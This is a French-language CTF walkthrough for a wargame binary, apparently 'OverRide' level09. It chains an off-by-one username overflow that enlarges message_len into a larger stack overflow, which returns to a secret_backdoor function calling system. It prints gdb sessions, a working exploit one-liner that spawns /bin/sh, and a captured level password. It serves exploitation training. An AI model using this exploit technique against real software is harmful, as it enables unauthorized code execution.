On observe dans le programme une fonction secret_backdoor avec un appel a system ainsi
qu'une structure initialise dans handle_msg qui ressemble a ca :
char message[140];
char username[40];
int message_len;

On observe dans la fonction set_username <= 40 ce qui vas donc check de 0 a 40 inclus
soit 41 valeurs. On a donc un overflow de 1 a cet endroit, on va essayer de l'utiliser
afin d'appeler secret_backdoor.

Pour ce faire on va profiter de l'overflow afin d'ecraser message_len contenant 140 par une valeur plus
grande comme 255.Pourquoi ? afin de creer un overflow plus grand un peu plus loin !
Un overflow de 1 n'est pas exploitable pour y inserer une adresse ou quoi que ce soit
cependant cette overflow nous permet de modifier message_len par une valeur plus grande comme /xff (255).
Variable elle meme utiliser plus tard dans set_msg, qui va nous permettre un overflow
plus grand et utilisable pour faire un ret2libC.

D'abord trouver l'adresse de secret_backdoor :

(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>

On va donc maintenant chercher l'offset de notre second overflow.
Pour ca rien de plus simple :
python -c 'print "A" * 40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4A"' > /tmp/offset
puis :
gdb level09
(gdb) r < /tmp/offset
Starting program: /home/users/level09/level09 < /tmp/level09
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) i r
rax            0xd    13
rbx            0x0    0
rcx            0x7ffff7b01f90    140737348902800
rdx            0x7ffff7dd5a90    140737351867024
rsi            0x7ffff7ff7000    140737354100736
rdi            0xffffffff    4294967295
rbp            0x6741356741346741    0x6741356741346741
rsp            0x7fffffffe5c8    0x7fffffffe5c8
r8             0x7ffff7ff7004    140737354100740
r9             0xc    12
r10            0x7fffffffde70    140737488346736
r11            0x246    582
r12            0x555555554790    93824992233360
r13            0x7fffffffe6b0    140737488348848
r14            0x0    0
r15            0x0    0
rip            0x555555554931    0x555555554931 <handle_msg+113>
eflags         0x10246    [ PF ZF IF RF ]
cs             0x33    51
ss             0x2b    43
ds             0x0    0
es             0x0    0
fs             0x0    0
gs             0x0    0

RBP 0x6741356741346741 donc on trouve donc un offset de 192 auquel on ajoute 8 afin d'atteindre RIP ce qui nous donne :

level09@OverRide:~$ (python -c 'print "A" * 40 + "\xff" + "\n" + "A"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh\n"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
